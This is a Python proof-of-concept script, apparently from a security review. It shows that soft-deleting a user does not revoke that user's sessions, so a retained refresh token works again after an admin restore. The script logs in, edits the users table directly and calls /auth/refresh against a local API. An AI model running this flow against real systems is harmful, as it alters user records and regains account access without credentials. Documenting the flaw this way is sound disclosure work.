#!/usr/bin/env python3
"""
PoC — VULN-03: Soft-delete sem revogação de sessões/JTIs + ressurreição de sessão.

Como NÃO existe UsersController no projeto, este PoC combina:
  - chamadas HTTP à API (/auth/login, /auth/refresh) para o fluxo de tokens;
  - acesso direto à base de dados (psycopg2) para:
      * inspecionar sessions.revoked_at (provar que o soft-delete NAO revoga);
      * simular usersService.remove() (UPDATE users SET deleted_at, is_active=false);
      * simular um "restore" de admin (limpar deleted_at, is_active=true).

Cenário:
  1. Login como vitima U -> refresh token R (sessao S, revoked_at NULL).
  2. Soft-delete U na BD (equivale a UsersService.remove(U)).
  3. Inspecionar S -> revoked_at continua NULL  <-- BUG irrefutável.
  4. Restore U (deleted_at=NULL, is_active=true)  <-- acao plausivel de admin.
  5. /auth/refresh com R -> 200 + novos tokens  <-- acesso recuperado sem password.

Uso:
  export DATABASE_URL="postgresql://user:pass@localhost:5432/db"
  export BASE_URL=http://localhost:3000
  export VICTIM_EMAIL=victim@example.com
  export VICTIM_PASSWORD='SenhaForte123!'
  python poc-vuln-03.py

Requisitos: pip install psycopg2-binary requests
"""

import os
import sys
import requests
import psycopg2

BASE_URL = os.getenv("BASE_URL", "http://localhost:3000").rstrip("/")
EMAIL = os.getenv("VICTIM_EMAIL", "victim@example.com")
PASSWORD = os.getenv("VICTIM_PASSWORD", "SenhaForte123!")
DATABASE_URL = os.environ.get("DATABASE_URL")

if not DATABASE_URL:
    print("Defina DATABASE_URL (ex.: postgresql://user:pass@localhost:5432/db)")
    sys.exit(2)

s = requests.Session()


def banner(t: str) -> None:
    print("\n" + "=" * 70)
    print(f"  {t}")
    print("=" * 70)


def db_exec(cur, sql, params=None):
    cur.execute(sql, params or ())
    try:
        return cur.fetchall()
    except psycopg2.ProgrammingError:
        return []


def session_state(cur, email):
    return db_exec(
        cur,
        """
        SELECT s.id, s.revoked_at, s.access_token_jti, s.refresh_token_hash
        FROM sessions s
        JOIN users u ON u.id = s.user_id
        WHERE u.email = %s
        ORDER BY s.created_at DESC
        LIMIT 5
        """,
        (email,),
    )


def main() -> int:
    banner("PASSO 1 — Login legitimo (obter R)")
    r = s.post(f"{BASE_URL}/auth/login",
               json={"email": EMAIL, "password": PASSWORD},
               headers={"Content-Type": "application/json"}, timeout=10)
    if r.status_code != 200:
        print(f"Login falhou: HTTP {r.status_code} {r.text}")
        return 2
    R = r.json()["refresh_token"]
    print(f"refresh_token R obtido (len={len(R)})")

    banner("PASSO 2 — Inspecionar sessao ANTES do soft-delete")
    conn = psycopg2.connect(DATABASE_URL)
    conn.autocommit = True
    cur = conn.cursor()
    rows = session_state(cur, EMAIL)
    print("Sessoes ativas antes:", rows)
    active_before = [r for r in rows if r[1] is None]
    if not active_before:
        print("[-] Sem sessao ativa para testar. Abortar.")
        return 1

    banner("PASSO 3 — Soft-delete (equivale a UsersService.remove)")
    cur.execute(
        "UPDATE users SET deleted_at = now(), is_active = false WHERE email = %s",
        (EMAIL,),
    )
    print(f"Linhas afetadas: {cur.rowcount}")

    banner("PASSO 4 — Inspecionar sessao APOS soft-delete (expectativa: revogada)")
    rows_after = session_state(cur, EMAIL)
    print("Sessoes apos soft-delete:", rows_after)
    still_active = [r for r in rows_after if r[1] is None]
    if still_active:
        print(f"[+] CONFIRMADO defeito irrefutável: {len(still_active)} sessao(oes) "
              "continuam com revoked_at = NULL apos o soft-delete.")
        print("    UsersService.remove() NAO revoga sessoes nem JTIs.")
    else:
        print("[-] Sessoes revogadas — aparentemente corrigido.")

    banner("PASSO 5 — Ressurreicao (admin restore)")
    cur.execute(
        "UPDATE users SET deleted_at = NULL, is_active = true WHERE email = %s",
        (EMAIL,),
    )
    print(f"User restaurado (linhas afetadas: {cur.rowcount})")

    banner("PASSO 6 — /auth/refresh com o R retido (sem reautenticar)")
    rr = s.post(f"{BASE_URL}/auth/refresh",
                json={"refresh_token": R},
                headers={"Content-Type": "application/json"}, timeout=10)
    print(f"/auth/refresh -> HTTP {rr.status_code}")
    if rr.status_code == 200 and "access_token" in rr.text:
        print("[+] CONFIRMADO VULN-03 (ressurreição): o refresh token pré-existente")
        print("    renovou apos soft-delete+restore, sem password. Acesso recuperado.")
        rc = 0
    else:
        print(f"[-] Refresh nao renovou: {rr.text[:200]}")
        print("    (Possivelmente a sessao ja tinha sido revogada por outro caminho,")
        print("     ou o defeito de revogacao foi corrigido.)")
        rc = 1

    cur.close()
    conn.close()
    return rc


if __name__ == "__main__":
    sys.exit(main())
